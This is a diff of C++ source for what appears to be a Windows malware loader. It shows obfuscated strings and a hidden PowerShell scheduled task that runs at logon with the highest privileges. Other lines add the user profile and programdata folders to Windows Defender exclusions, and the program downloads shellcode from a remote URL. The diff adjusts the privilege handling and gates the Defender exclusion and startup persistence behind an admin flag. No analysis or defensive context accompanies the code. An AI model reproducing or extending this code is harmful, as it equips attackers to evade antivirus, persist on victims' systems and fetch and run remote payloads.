@@ -279,7 +279,7 @@ BOOL persistence(const std::string& taskName, const std::string& executablePath)
     std::string command = std::string(OBF("Register-ScheduledTask -TaskName \"")) + taskName +
         std::string(OBF("\" -Trigger (New-ScheduledTaskTrigger -AtLogon) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -RunOnlyIfNetworkAvailable -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0) -Action (New-ScheduledTaskAction -Execute '")) +
         std::string(longPath.begin(), longPath.end()) + std::string(OBF("') -Force -RunLevel Highest"));
-    HINSTANCE hInst = ShellExecuteA(NULL, OBF("runas"), OBF("powershell.exe"), command.c_str(), NULL, SW_HIDE);
+    HINSTANCE hInst = ShellExecuteA(NULL, OBF("open"), OBF("powershell.exe"), command.c_str(), NULL, SW_HIDE);
     return 0;
 }
 
@@ -361,12 +361,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
         (void)__r; 
     }
+#if ENABLE_ADMIN
     if (ADD_EXCLUSION) {
         ShellExecute(NULL, OBF("open"), OBF("powershell"), OBF("Add-MpPreference -ExclusionPath @($env:userprofile, $env:programdata) -Force"), NULL, SW_HIDE);
     }
     if (ENABLE_STARTUP && !existence(DIRECTORY_NAME)) {
         persist_folder();
     }
+#endif
     std::vector<BYTE> payload;
     LPCWSTR url = SHELLCODE_URL;
     payloadurl(url, payload);
